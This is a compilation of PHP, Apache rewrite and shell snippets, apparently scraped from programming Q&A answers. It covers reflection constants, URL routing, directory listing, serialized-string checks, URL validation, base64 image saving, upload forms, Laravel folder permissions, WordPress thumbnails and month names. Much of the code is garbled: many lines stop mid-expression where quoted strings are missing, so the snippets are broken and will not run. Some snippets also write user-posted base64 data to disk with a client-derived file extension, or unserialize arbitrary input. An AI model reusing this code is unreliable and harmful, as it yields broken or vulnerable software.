<?php class Cl { const AAA = 1; const BBB = 2; } $r = new ReflectionClass( print_r($r->getConstants());
class Profile { const LABEL_FIRST_NAME = "First Name"; const LABEL_LAST_NAME = "Last Name"; const LABEL_COMPANY_NAME = "Company"; public static function getAllConsts() { return (new ReflectionClass(get_class()))->getConstants(); } } print_r(Profile::getAllConsts());
/** * ConstantExport Trait implements getConstants() method which allows * to return class constant as an assosiative array */ Trait ConstantExport { /** * @return [const_name => */ static function getConstants(){ $refl = new \ReflectionClass(__CLASS__); return $refl->getConstants(); } } Class Profile { const LABEL_FIRST_NAME = "First Name"; const LABEL_LAST_NAME = "Last Name"; const LABEL_COMPANY_NAME = "Company"; use ConstantExport; }
$constList = Profile::getConstants(); print_r($constList);
Array ( [LABEL_FIRST_NAME] => First Name [LABEL_LAST_NAME] => Last Name [LABEL_COMPANY_NAME] => Company )
namespaces enums; class enumCountries { const CountryAustria = 1 ; const CountrySweden = 24; const CountryUnitedKingdom = 25; }
namespace Helpers; class Helpers { static function getCountries() { $c = new \ReflectionClass( return $c->getConstants(); } }
Class Qwerty { const __COOKIE_LANG_NAME__ = "zxc"; const __UPDATE_COOKIE__ = 30000; public function getConstants_(){ return [ } static function getConstantsStatic_(){ return [ } }
$objC = new Qwerty(); var_dump($objC->getConstants_()); var_dump(Qwerty::getConstantsStatic_());
[XDebug] zend_extension = "C:\xampp\php\ext\php_xdebug.dll" ; Other settings if needed xdebug.max_nesting_level = 500
RewriteEngine on RewriteRule ^/?Some-text-goes-here/([0-9]+)$ /picture.php?id=$1
$path = ltrim($_SERVER[ $elements = explode( if(empty($elements[0])) { ShowHomepage(); } else switch(array_shift($elements)) { case ShowPicture($elements); break; case ... default: header( Show404Error(); }
RewriteEngine On RewriteRule ^inc/.*$ index.php RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ index.php [QSA,L]
$uri = rtrim( dirname($_SERVER["SCRIPT_NAME"]), $uri = $uri = urldecode( $uri );
foreach ( $rules as $action => $rule ) { if ( preg_match( /* now you know the action and parameters so you can * include appropriate template file ( or proceed in some other way ) */ } }
define( $rules = array( ); $uri = rtrim( dirname($_SERVER["SCRIPT_NAME"]), $uri = $uri = urldecode( $uri ); foreach ( $rules as $action => $rule ) { if ( preg_match( /* now you know the action and parameters so you can * include appropriate template file ( or proceed in some other way ) */ include( INCLUDE_DIR . $action . exit(); } } include( INCLUDE_DIR .
RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-l RewriteCond %{REQUEST_URI} !-l RewriteCond %{REQUEST_FILENAME} !\.(ico|css|png|jpg|gif|js)$ [NC] RewriteRule . index.php
RewriteEngine On RewriteRule ^([^/]+)/([^/]+)/([\d]+)$ $1?id=$3 [L]
foreach($array as $element) { foreach($element as $key => $value) { if($key == unset($element); unset($array,$element); } } }
foreach($array as $elementKey => $element) { foreach($element as $valueKey => $value) { if($valueKey == unset($array[$elementKey]); } } }
foreach($array as $elementKey => &$element) { if (isset($element[ unset($element); } }
reset($array); while (list($elementKey, $element) = each($array)) { while (list($key, $value2) = each($element)) { if($key == unset($array[$elementKey]); } } }
public function getAllPosts() { return Post::with( }
select * from `posts` select * from `users` where `users`.`id` in (<1>, <2>)
select * from `posts` select id,username from `users` where `users`.`id` in (<1>, <2>)
public function user() { return $this->belongsTo( }
public function userWithName() { return $this->belongsTo( }
App\Models\User::find(2)->posts->pluck( => Illuminate\Support\Collection { all: [ "1", "2", "3", ], }
$dir = new DirectoryIterator($path); foreach ($dir as $fileinfo) { if ($fileinfo->isDir() && !$fileinfo->isDot()) { echo $fileinfo->getFilename(). } }
$iterator = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($yourStartingPath), RecursiveIteratorIterator::SELF_FIRST); foreach($iterator as $file) { if($file->isDir()) { echo strtoupper($file->getRealpath()), PHP_EOL; } }
<?php $path = $dirs = array(); $dir = dir($path); while (false !== ($entry = $dir->read())) { if ($entry != if (is_dir($path . $dirs[] = $entry; } } } echo "<pre>"; print_r($dirs); exit;
function expandDirectoriesMatrix($base_dir, $level = 0) { $directories = array(); foreach(scandir($base_dir) as $file) { if($file == $dir = $base_dir.DIRECTORY_SEPARATOR.$file; if(is_dir($dir)) { $directories[]= array( ); } } return $directories; }
$dir = $directories = expandDirectoriesMatrix($dir); echo $directories[0][ echo $directories[0][ echo $directories[0][ echo $directories[0][ echo $directories[0][ echo $directories[0][ echo $directories[0][
function showDirectories($list, $parent = array()) { foreach ($list as $directory){ $parent_name = count($parent) ? " parent: ({$parent[ $prefix = str_repeat( echo "$prefix {$directory[ if(count($directory[ showDirectories($directory[ } } } showDirectories($directories);
/** * Get all of the directories within a given directory. * * @param string $directory * @return array */ function directories($directory) { $glob = glob($directory . if($glob === false) { return array(); } return array_filter($glob, function($dir) { return is_dir($dir); }); }
<?php $yourStartingPath = "photos\\"; $iterator = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($yourStartingPath), RecursiveIteratorIterator::SELF_FIRST); foreach($iterator as $file) { if($file->isDir()) { $path = strtoupper($file->getRealpath()) ; $path2 = PHP_EOL; $path3 = $path.$path2; $result = end(explode( echo "<br />". basename($result ); } } ?>
function getDirectories(string $path) : array { $directories = []; $items = scandir($path); foreach ($items as $item) { if($item == continue; if(is_dir($path. $directories[] = $item; } return $directories; }
function get_all_php_files($directory) { $directory_stack = array($directory); $ignored_filename = array( ); $file_list = array(); while ($directory_stack) { $current_directory = array_shift($directory_stack); $files = scandir($current_directory); foreach ($files as $filename) { $pathname = $current_directory . DIRECTORY_SEPARATOR . $filename; if (isset($filename[0]) && ( $filename[0] === $filename[0] === isset($ignored_filename[$filename]) )) { continue; } else if (is_dir($pathname) === TRUE) { $directory_stack[] = $pathname; } else if (pathinfo($pathname, PATHINFO_EXTENSION) === $file_list[] = $pathname; } } } return $file_list; }
<?php /** * Function for recursive directory file list search as an array. * * @param mixed $dir Main Directory Path. * * @return array */ function listFolderFiles($dir) { $fileInfo = scandir($dir); $allFileLists = []; foreach ($fileInfo as $folder) { if ($folder !== if (is_dir($dir . DIRECTORY_SEPARATOR . $folder) === true) { $allFileLists[$folder . } else { $allFileLists[$folder] = $folder; } } } return $allFileLists; } $dir = listFolderFiles( echo print_r($dir); echo ?>
<?php /** * Function for recursive directory file list search as an array. * * @param mixed $dir Main Directory Path. * * @return array */ function listFolderFiles($dir) { $fileInfo = scandir($dir); $allFileLists = []; foreach ($fileInfo as $folder) { if ($folder !== if (is_dir($dir . DIRECTORY_SEPARATOR . $folder) === true) { $allFileLists[$folder . echo } else { echo } } } return $allFileLists; } listFolderFiles( $dir = listFolderFiles( echo print_r($dir); echo ?>
function scanner($path){ $result = []; $scan = glob($path . foreach($scan as $item){ if(is_dir($item)) $result[basename($item)] = scanner($item); else $result[] = basename($item); } return $result; }
array(6) { ["about"]=> array(2) { ["factory"]=> array(0) { } ["persons"]=> array(0) { } } ["contact"]=> array(0) { } ["home"]=> array(1) { [0]=> string(5) "index.php" } ["projects"]=> array(0) { } ["researches"]=> array(0) { } [0]=> string(5) "index.php" }
function getSubDirectories($dir) { $subDir = array(); $directories = array_filter(glob($dir), $subDir = array_merge($subDir, $directories); foreach ($directories as $directory) $subDir = array_merge($subDir, getSubDirectories($directory. return $subDir; }
function getAllSubdir($dir, &$fullDir = []) { $currentDir = scandir($dir); foreach ($currentDir as $key => $val) { $realpath = realpath($dir . DIRECTORY_SEPARATOR . $val); if (!is_dir($realpath) && $filename != "." && $filename != "..") { getDirRecursive($realpath, $fullDir); $fullDir[] = $realpath; } } return $fullDir; } var_dump(scanDirAndSubdir(
array (size=4) 0 => string 1 => string 2 => string 3 => string
class B { public function method_from_b($s) { echo $s; } } class C { public function method_from_c($s) { echo $s; } } class A extends B { private $c; public function __construct() { $this->c = new C; } public function __call($method, $args) { $this->c->$method($args[0]); } } $a = new A; $a->method_from_b("abc"); $a->method_from_c("def");
Matron extends Nurse Consultant extends Doctor Nurse extends HumanEntity Doctor extends HumanEntity HumanEntity extends DatabaseTable DatabaseTable extends AbstractTable
class Extendable{ private $extender=array(); public function addExtender(Extender $obj){ $this->extenders[] = $obj; $obj->setExtendee($this); } public function __call($name, $params){ foreach($this->extenders as $extender){ if (method_exists($extender, $name)){ return call_user_func_array(array($extender, $name), $params); } } } } $foo = new Extendable(); $foo->addExtender(new OtherClass()); $foo->other_class_method();
class firstInheritance{} class secondInheritance extends firstInheritance{} class someFinalClass extends secondInheritance{}
class A{ function a_hi(){ echo "I am a of A".PHP_EOL."<br>".PHP_EOL; } } class B extends A{ function b_hi(){ echo "I am b of B".PHP_EOL."<br>".PHP_EOL; } } class C extends B{ function c_hi(){ echo "I am c of C".PHP_EOL."<br>".PHP_EOL; } } $myTestInstance = new C(); $myTestInstance->a_hi(); $myTestInstance->b_hi(); $myTestInstance->c_hi();
class C { private $a, $b; public function __construct($x, $y) { $this->a = new A(42, $x); $this->b = new B($y); } protected function DoSomething() { $this->a->Act(); $this->b->Do(); } }
trait business{ function sell(){ } function buy(){ } function collectMoney(){ } } trait human{ function think(){ } function speak(){ } } class BusinessPerson{ use business; use human; } class BusinessWoman extends BusinessPerson{ function getPregnant(){ } } $bw = new BusinessWoman(); $bw ->speak(); $bw->getPregnant();
<?php Abstract class ExtensionBridge { private $_exts = array(); public $_this; function __construct(){$_this = $this;} public function addExt($object) { $this->_exts[]=$object; } public function __get($varname) { foreach($this->_exts as $ext) { if(property_exists($ext,$varname)) return $ext->$varname; } } public function __call($method,$args) { foreach($this->_exts as $ext) { if(method_exists($ext,$method)) return call_user_method_array($method,$ext,$args); } throw new Exception("This Method {$method} doesn } } class Ext1{ private $name=""; private $id=""; public function setID($id){$this->id = $id;} public function setName($name){$this->name = $name;} public function getID(){return $this->id;} public function getName(){return $this->name;} } class Ext2{ private $address=""; private $country=""; public function setAddress($address){$this->address = $address;} public function setCountry($country){$this->country = $country;} public function getAddress(){return $this->address;} public function getCountry(){return $this->country;} } class Extender extends ExtensionBridge { function __construct() { parent::addExt(new Ext1()); parent::addExt(new Ext2()); } public function __toString() { return $this->getName(). } } $o = new Extender(); $o->setName("Mahdi"); $o->setCountry("Al-Ahwaz"); echo $o; ?>
<?php interface Animal { public function sayHello(); } interface HairyThing { public function plush(); } interface Dog extends Animal, HairyThing { public function bark(); } class Puppy implements Dog { public function bark() { echo "ouaf"; } public function sayHello() { echo "hello"; } public function plush() { echo "plush"; } } echo PHP_VERSION; $o = new Puppy(); $o->bark(); $o->plush(); $o->sayHello();
interface Swift_Transport_IoBuffer extends Swift_InputByteStream, Swift_OutputByteStream
class Session { public $username; } class MyServiceResponsetype { protected $only_avaliable_in_response; } class SessionResponse extends MyServiceResponsetype { /** has shared $only_avaliable_in_response */ public $session; public function __construct(Session $session) { $this->session = $session; } }
class B { public function method_from_b($s) { echo $s; } } class C { public function method_from_c($l, $l1, $l2) { echo $l.$l1.$l2; } } class A extends B { private $c; public function __construct() { $this->c = new C; } public function __call($method, $args) { if (method_exists($this->c, $method)) { $reflection = new ReflectionMethod($this->c, $method); if (!$reflection->isPublic()) { throw new RuntimeException("Call to not public method ".get_class($this)."::$method()"); } return call_user_func_array(array($this->c, $method), $args); } else { throw new RuntimeException("Call to undefined method ".get_class($this)."::$method()"); } } } $a = new A; $a->method_from_b("abc"); $a->method_from_c("d", "e", "f");
class Herbivore: def eat(self, food): print("Food is supposed to be vegan") class Carnivore: def eat(self, food): print("Food is supposed to be meaty") class Omnivore(Carnivore, Herbivore): def eat(self, food): print("Food has to either bee meaty or vegan")
$myarray [0] a->1 [1] a-7 b->3 [3] a-8 b->6 [4] a-3 b->2
$array = array( 0 => $arrays =$array; print_r($array); $array=array(); $i=0; foreach($arrays as $k => $item) { $array[$i]=$item; unset($arrays[$k]); $i++; } print_r($array);
private function multiExplode($delimiters,$string) { $ary = explode($delimiters[0],$string); array_shift($delimiters); if($delimiters != NULL) { if(count($ary) <2) $ary = $this->multiExplode($delimiters, $string); } return $ary; }
function multiexplode ($delimiters,$string) { $ready = str_replace($delimiters, $delimiters[0], $string); $launch = explode($delimiters[0], $ready); return $launch; } $text = "here is a sample: this text, and this will be exploded. this also | this one too :)"; $exploded = multiexplode(array(",",".","|",":"),$text); print_r($exploded);
private function multiExplode($delimiters,$string) { return explode($delimiters[0],strtr($string,array_combine(array_slice($delimiters,1),array_fill(0,count($delimiters)-1,array_shift($delimiters)))))); }
public static function multiExplode($delims, $string, $special = if (is_array($delims) == false) { $delims = array($delims); } if (empty($delims) == false) { foreach ($delims as $d) { $string = str_replace($d, $special, $string); } } return explode($special, $string); }
$stringToSplit = $split = explode ( "\n\r", $stringToSplit ) ) );
function explodeX( $delimiters, $string ) { return explode( chr( 1 ), str_replace( $delimiters, chr( 1 ), $string ) ); } $list = $exploded = explodeX( array( echo print_r($exploded); echo
<?php class Car { public static function run() { return static::getName(); } private static function getName() { return } } class Toyota extends Car { public static function getName() { return } } echo Car::run(); echo Toyota::run(); ?>
class alpha { function classname(){ return __CLASS__; } function selfname(){ return self::classname(); } function staticname(){ return static::classname(); } } class beta extends alpha { function classname(){ return __CLASS__; } } $beta = new beta(); echo $beta->selfname(); echo $beta->staticname();
<?php class Animal { public static function StaticCall() { return static::getAnimalName(); } public static function SelfCall() { return self::getWeight(); } private static function getAnimalName(){ return } private static function getWeight(){ return } } class Bird extends Animal { public static function getAnimalName(){ return } private static function getWeight(){ return } } echo Animal::StaticCall(); echo Animal::SelfCall(); echo Bird::StaticCall(); echo Bird::SelfCall();
class A { static $c = 7; public static function getVal() { return self::$c; } } class B extends A { static $c = 8; } B::getVal();
class A { static $c = 7; public static function getVal() { return static::$c; } } class B extends A { static $c = 8; } B::getVal();
abstract class Builder { public static function build() { return new static; } } class Member extends Builder { public function who_am_i() { echo } } Member::build()->who_am_i();
$str = $data = @unserialize($str); if ($data !== false) { echo "ok"; } else { echo "not ok"; }
$data = @unserialize($str); if ($str === echo "ok"; } else { echo "not ok"; }
<?php function is_serialized( $data ) { if ( !is_string( $data ) ) return false; $data = trim( $data ); if ( return true; if ( !preg_match( return false; switch ( $badions[1] ) { case case case if ( preg_match( "/^{$badions[1]}:[0-9]+:.*[;}]\$/s", $data ) ) return true; break; case case case if ( preg_match( "/^{$badions[1]}:[0-9.E-]+;\$/", $data ) ) return true; break; } return false; }
/** * Check if a string is serialized * @param string $string */ public static function is_serial($string) { return (@unserialize($string) !== false); }
/** * Check if a string is serialized * @param string $string */ public static function is_serial($string) { return (@unserialize($string) !== false || $string == }
<?php ini_set( ini_set( error_reporting( E_ALL ); $valueToUnserialize = serialize( false ); $unserialized = @unserialize( $valueToUnserialize ); if ( FALSE === $unserialized && isset( $php_errormsg ) && strpos( $php_errormsg, { echo echo $valueToUnserialize; } else { echo var_dump( $unserialized ); }
$data = @unserialize($str); if($data !== false || $str === echo else echo "not ok";
/** * some people will look down on this little puppy */ function isSerialized($s){ if( stristr($s, stristr($s, stristr($s, stristr($s, ){ return true; }else{ return false; } }
function isSerialized($value) { return preg_match( }
function is_serialized($data, $strict = true) { if (!is_string($data)) { return false; } $data = trim($data); if ( return true; } if (strlen($data) < 4) { return false; } if ( return false; } if ($strict) { $lastc = substr($data, -1); if ( return false; } } else { $semicolon = strpos($data, $brace = strpos($data, if (false === $semicolon && false === $brace) return false; if (false !== $semicolon && $semicolon < 3) return false; if (false !== $brace && $brace < 4) return false; } $token = $data[0]; switch ($token) { case if ($strict) { if ( return false; } } elseif (false === strpos($data, return false; } case case return (bool)preg_match("/^{$token}:[0-9]+:/s", $data); case case case $end = $strict ? return (bool)preg_match("/^{$token}:[0-9.E-]+;$end/", $data); } return false; }
<?php function is_serialized($data){ return (is_string($data) && preg_match(" } ?>
if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) { die( }
<?php $url = "http: $url = filter_var($url, FILTER_SANITIZE_URL); if (filter_var($url, FILTER_VALIDATE_URL) !== false) { echo("$url is a valid URL"); } else { echo("$url is not a valid URL"); } ?>
FILTER_FLAG_SCHEME_REQUIRED - URL must be RFC compliant (like http: FILTER_FLAG_HOST_REQUIRED - URL must include host name (like http: FILTER_FLAG_PATH_REQUIRED - URL must have a path after the domain name (like www.example.com/example1/) FILTER_FLAG_QUERY_REQUIRED - URL must have a query string (like "example.php?name=Peter&age=37")
<?php function validate_url($url) { $path = parse_url($url, PHP_URL_PATH); $encoded_path = array_map( $url = str_replace($path, implode( return filter_var($url, FILTER_VALIDATE_URL) ? true : false; } if(!validate_url("http: echo "NOT A URL"; } else { echo "IS A URL"; }
function is_url($uri){ if(preg_match( return $uri; } else{ return false; } }
function is_url($url){ $response = array(); if(!empty($url)) { $response = get_headers($url); } return (bool)in_array("HTTP/1.1 200 OK", $response, true); /*Array ( [0] => HTTP/1.1 200 OK [Date] => Sat, 29 May 2004 12:28:14 GMT [Server] => Apache/1.3.27 (Unix) (Red-Hat/Linux) [Last-Modified] => Wed, 08 Jan 2003 23:11:55 GMT [ETag] => "3f80f-1b6-3e1cb03b" [Accept-Ranges] => bytes [Content-Length] => 438 [Connection] => close [Content-Type] => text/html )*/ }
$baseUrl = url( $posted_url = "home"; /*$posted_url = "/home"; $posted_url = "xrepeater.com"; $posted_url = "www.xrepeater.com"; $posted_url = "http: $posted_url = "https: $posted_url = "https: $posted_url = "xrepeater.dev/home/test"; $posted_url = "home/test";*/ $regularExpression = "((https?|ftp)\:\/\/)?"; $regularExpression .= "([a-z0-9+!*(),;?&=\$_.-]+(\:[a-z0-9+!*(),;?&=\$_.-]+)?@)?"; $regularExpression .= "([a-z0-9-.]*)\.([a-z]{2,3})"; $regularExpression .= "(\:[0-9]{2,5})?"; $regularExpression .= "(\/([a-z0-9+\$_-]\.?)+)*\/?"; $regularExpression .= "(\?[a-z+&\$_.-][a-z0-9;:@&%=+\/\$_.-]*)?"; $regularExpression .= "( if(preg_match("/^$regularExpression$/i", $posted_url)) { if(preg_match("@^http|https: $final_url = preg_replace("@(http: } else { $final_url = } } else { if (substr($posted_url, 0, 1) === $final_url = $baseUrl.$posted_url; } else { $final_url = $baseUrl."/".$final_url; } }
function isValidUrl($url) { $url = parse_url($url); if (!isset($url["host"])) return false; return !(gethostbyname($url["host"]) == $url["host"]); }
function base64_to_jpeg( $base64_string, $output_file ) { $ifp = fopen( $output_file, "wb" ); fwrite( $ifp, base64_decode( $base64_string) ); fclose( $ifp ); return( $output_file ); } $image = base64_to_jpeg( $my_base64_string,
function base64_to_jpeg($base64_string, $output_file) { $ifp = fopen( $output_file, $data = explode( fwrite( $ifp, base64_decode( $data[ 1 ] ) ); fclose( $ifp ); return $output_file; }
function save_base64_image($base64_image_string, $output_file_without_extension, $path_with_end_slash="" ) { // $splited = explode( $mime=$splited[0]; $data=$splited[1]; $mime_split_without_base64=explode( $mime_split=explode( if(count($mime_split)==2) { $extension=$mime_split[1]; if($extension== $output_file_with_extension=$output_file_without_extension. } file_put_contents( $path_with_end_slash . $output_file_with_extension, base64_decode($data) ); return $output_file_with_extension; }
file_put_contents($output_file, file_get_contents($base64_string));
if($_SERVER[ $image_no="5"; $image = $_POST[ $path = "uploads/".$image_no.".png"; $status = file_put_contents($path,base64_decode($image)); if($status){ echo "Successfully Uploaded"; }else{ echo "Upload failed"; } }
$image = $request->image; $imageInfo = explode(";base64,", $image); $imgExt = str_replace( $image = str_replace( $imageName = "post-".time().".".$imgExt; Storage::disk(
$datetime = date("Y-m-d h:i:s"); $timestamp = strtotime($datetime); $image = $_POST[ $imgdata = base64_decode($image); $f = finfo_open(); $mime_type = finfo_buffer($f, $imgdata, FILEINFO_MIME_TYPE); $temp=explode( $path = "uploads/$timestamp.$temp[1]"; file_put_contents($path,base64_decode($image)); echo "Successfully Uploaded->>> $timestamp.$temp[1]";
$input = array(1, 2, 3, 4, 5, 6); array_splice($input, 5);
array array_splice ( array &$input , int $offset [, int $length = 0 [, mixed $replacement]])
<?php if (!empty ( $an_array ) ) { $min = min ( count ( $an_array ), 5 ); $i = 0; foreach ($value in $an_array) { echo $value; $i++; if ($i == $min) break; } } ?>
<?php function GetElements( $an_array, $elements ) { return array_slice( $an_array, 0, $elements ); } ?>
<VirtualHost *:80> ServerName server.example.org ServerAlias *.example.org UseCanonicalName Off </VirtualHost>
preg_match( if(isset($matches[1])) { $subdomain = $matches[1]; }
RewriteEngine on RewriteCond %{HTTP_HOST} ^[^.]+\.example\.com$ RewriteRule !^index\.php$ index.php [L]
RewriteCond %{ENV:REDIRECT_SUBDOMAIN} ="" RewriteCond %{HTTP_HOST} ^([a-z0-9][-a-z0-9]+)\.domain\.com\.?(:80)?$ [NC] RewriteCond %{DOCUMENT_ROOT}/%1 -d RewriteRule ^(.*) %1/$1 [E=SUBDOMAIN:%1,L] RewriteRule ^ - [E=SUBDOMAIN:%{ENV:REDIRECT_SUBDOMAIN},L]
function create_subdomain($subDomain,$cPanelUser,$cPanelPass,$rootDomain) { $buildRequest = "/frontend/x3/subdomain/doadddomain.html?rootdomain=" . $rootDomain . "&domain=" . $subDomain . "&dir=public_html/subdomains/" . $subDomain; $openSocket = fsockopen( if(!$openSocket) { return "Socket error"; exit(); } $authString = $cPanelUser . ":" . $cPanelPass; $authPass = base64_encode($authString); $buildHeaders = "GET " . $buildRequest ."\r\n"; $buildHeaders .= "HTTP/1.0\r\n"; $buildHeaders .= "Host:localhost\r\n"; $buildHeaders .= "Authorization: Basic " . $authPass . "\r\n"; $buildHeaders .= "\r\n"; fputs($openSocket, $buildHeaders); while(!feof($openSocket)) { fgets($openSocket,128); } fclose($openSocket); $newDomain = "http: }
Options +FollowSymLinks RewriteEngine On RewriteBase / RewriteRule ^([aA-zZ0-9]+)$ index.php?data=$1 RewriteCond %{HTTP_HOST} ^([aA-zZ0-9]+)\.([aA-zZ0-9-]+)\.([aA-zZ]+) RewriteRule ([aA-zZ0-9]+) index.php?data=%1
define("SUBDOMAIN_PARENT","domainname.tld"); class getData { function __construct() { $this->data=""; $http_host=$_SERVER[ $subdom_data= str_replace(SUBDOMAIN_PARENT,"",$http_host); $expl_subdom_data=explode(".",$subdom_data); $expl_subdom_data=array_filter($expl_subdom_data); if($expl_subdom_data!=NULL) { $this->data=end($expl_subdom_data); } } } $GLOBALS[
<html> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head> <body> <form enctype="multipart/form-data" action="vanilla-upload.php" method="POST"> Choose a file to upload: <input name="uploadedfile" type="file" /><br /> <input type="submit" value="Upload File" /> </form> </body> </html>
<input type="file" name="files[]"> <input type="file" name="files[]">
file_uploads = On; sounds like you already did this post_max_size = 8M; change this higher if needed upload_max_filesize = 8M; change this higher if needed
<form action="upload.php" method="post" enctype="multipart/form-data"> Select image to upload: <input type="file" name="fileToUpload" id="fileToUpload"> <input type="submit" value="Upload Image" name="submit"> </form>
echo $upload_max_size = ini_get( echo $post_max_size=ini_get(
"...localhost:63342/CB_Upload/index.php?_ijt=j2hcbacqepj87bvg66ncuohvne"
<span class="span_left">Photos (gif/jpg/jpeg/png) </span> <form enctype="multipart/form-data" method="post"> <input name="files[]" type="file" id="upload_file" /> <input type="button" id="upload" value="Upload photo" /> </form>
<div> <span class="span_left">Photos (gif/jpg/jpeg/png) </span> <form enctype="multipart/form-data" method="post"> </div> <div style="clear:both"></div> <input name="files[]" type="file" id="upload_file" /> <input type="button" id="upload" value="Upload photo" /> </form> <div style="clear:both"></div>
<div> <span class="span_left">Photos (gif/jpg/jpeg/png) </span> </div> <div style="clear:both"></div> <form enctype="multipart/form-data" method="post"> <input name="files[]" type="file" id="upload_file" /> <input type="button" id="upload" value="Upload photo" /> </form> <div style="clear:both"></div>
<form action="upload.php" method="post" enctype="multipart/form-data" data-ajax="false"> Select image to upload: <input type="file" name="fileToUpload" id="fileToUpload"> <input type="submit" value="Upload Image" name="submit"> </form>
sudo chown -R www-data:www-data /path/to/your/project/vendor sudo chown -R www-data:www-data /path/to/your/project/storage
sudo dseditgroup -o edit -a yourusername -t user _www
sudo chgrp -R www-data storage bootstrap/cache sudo chmod -R ug+rwx storage bootstrap/cache
-rw-r--r-- 1 www-data www-data 1005 Dec 6 09:40 969370d7664df9c5206b90cd7c2c79c2
-rw-rw-r-- 1 user www-data 16191 Dec 6 09:48 2a1683fac0674d6f8b0b54cbc8579f8e
cd /var/www/projectroot sudo chmod 750 ./ sudo chgrp www-data ./
sudo chmod 2775 bootstrap/cache sudo chgrp -R www-data bootstrap/cache
find storage -type d -exec sudo chmod 2775 {} \; find storage -type f -exec sudo chmod 664 {} \; sudo chgrp -R www-data storage
chmod +x .git/hooks/* rm vendor/* composer install -o
sudo systemctl edit php7.0-fpm.service Use: [Service] UMask=0002 Then: sudo systemctl daemon-reload sudo systemctl restart php7.0-fpm.service
"scripts": { ... "post-install-cmd": [ "chgrp -R www-data storage bootstrap/cache", "chmod -R ug+rwx storage bootstrap/cache" ] ... }
<?php if (has_post_thumbnail( $post->ID ) ): ?> <?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), <div id="custom-bg" style="background-image: url( </div> <?php endif; ?>
<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID), <img src="<?php echo $url ?>" />
<?php $feat_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID) ); echo $feat_image; ?>
<?php wp_get_attachment_url(get_post_thumbnail_id(get_the_ID())) ?>
<?php $feat_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID) ); echo $feat_image; ?>
if ( has_post_thumbnail() ) { $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), }
<?php $image_url = wp_get_attachment_url( get_post_thumbnail_id($post->ID) ); ?> <a href="<?php echo $image_url; ?>" rel="prettyPhoto">
<?php $url = wp_get_attachment_url( get_post_thumbnail_id($post->ID), <img src="<?php echo $url ?>" />
<?php if (has_post_thumbnail( $post->ID ) ): $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), ?> <img src="<?php echo $image[0]; ?>"> <?php endif; ?>
<?php "<div><a href=".get_permalink(id).">".wp_get_attachment_url(304, array(50,50), 1)."</a></div>"; ?>
<img src="<?php echo get_post_meta($post->ID, "mabp_thumbnail_url", true); ?>" alt="<?php the_title(); ?>" width ="100%" height ="" />
<?php $image_src = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), $feature_image_url = $image_src[0]; ?>
$monthNum = sprintf("%02s", $result["month"]); $monthName = date("F", strtotime($monthNum)); echo $monthName;
$monthNum = 3; $dateObj = DateTime::createFromFormat( $monthName = $dateObj->format(
$dt = DateTime::createFromFormat( echo $dt->format(
<?php $monthNum = 5; $monthName = date("F", mktime(0, 0, 0, $monthNum, 10)); echo $monthName; ?>
$monthNum = sprintf("%02s", $result["month"]); $monthName = date("F", mktime(null, null, null, $monthNum)); echo $monthName;
echo date("F", mktime(null, null, null, $result["month"], 1));
for ($i = 0; $i < 12; ++$i) { $months[$m] = $m = date("F", strtotime("January +$i months")); }
echo date("F", strtotime(date("Y") ."-". $i ."-01"))
$monthNum = 5; $monthName = date("F", mktime(0, 0, 0, $monthNum, 10));
setlocale(LC_ALL,"US"); $date = $month_name = ucfirst(strftime("%B", strtotime($date))); echo $month_name;
echo date("F", mktime(0, 0, 0, $result["month"], 1));
/*** * returns the month in words for a given month number */ date("F", strtotime(date("Y")."-".$month."-01"));
$monthNum = sprintf("%02s", $result["month"]); $monthName = cal_info(0); $monthName = $monthName[months][$monthNum]; echo $monthName;
$name = jdmonthname(gregoriantojd($monthNumber, 1, 1), CAL_MONTH_GREGORIAN_LONG);
function getMonthString($m){ if($m==1){ return "January"; }else if($m==2){ return "February"; }else if($m==3){ return "March"; }else if($m==4){ return "April"; }else if($m==5){ return "May"; }else if($m==6){ return "June"; }else if($m==7){ return "July"; }else if($m==8){ return "August"; }else if($m==9){ return "September"; }else if($m==10){ return "October"; }else if($m==11){ return "November"; }else if($m==12){ return "December"; } }
echo jdmonthname($monthNum, CAL_MONTH_GREGORIAN_LONG);
$json = "{"; foreach($result as $addr) { foreach($addr as $line) { $json .= $line . "\n"; } $json .= "\n\n"; } $json .= "}";
<?php include( $Json = new json( $Json = new json( $Json = new json(); $object = new stdClass(); $object->test = $arraytest = array( $jsonOnly = $Json->add( $Json->add( $Json->add( $Json->add("An_Array",$arraytest); $Json->add("A_Json",$jsonOnly); $Json->send(); ?>
echo "{\"status\" : \"400\", \"responce\" : \"603\", \"message\" : \"You Enter Wrong Username OR Password\", \"feed\":".str_replace("<p>","",$responso). "}";
var object = { p : "value", p1 : [ "john", "johnny" ] } ; alert(object.p1[1]) ;
<?php class Foo {} $child = new class extends Foo {}; var_dump($child instanceof Foo); ?>
$anonim_obj = new AnObj(array( "foo" => function() { echo "foo"; }, "bar" => function($bar) { echo $bar; } )); $anonim_obj->foo(); $anonim_obj->bar("hello, world"); $anonim_obj->zoo = function() { echo "zoo"; }; $anonim_obj->zoo(); $anonim_obj->prop = "abc"; $anonim_obj->propMethod = function() use($anonim_obj) { echo $anonim_obj->prop; }; $anonim_obj->propMethod();
<?php class Object { function __construct( ) { $n = func_num_args( ) ; for ( $i = 0 ; $i < $n ; $i += 2 ) { $this->{func_get_arg($i)} = func_get_arg($i + 1) ; } } } $o = new Object( echo $o->anotherProperty[1]; ?>
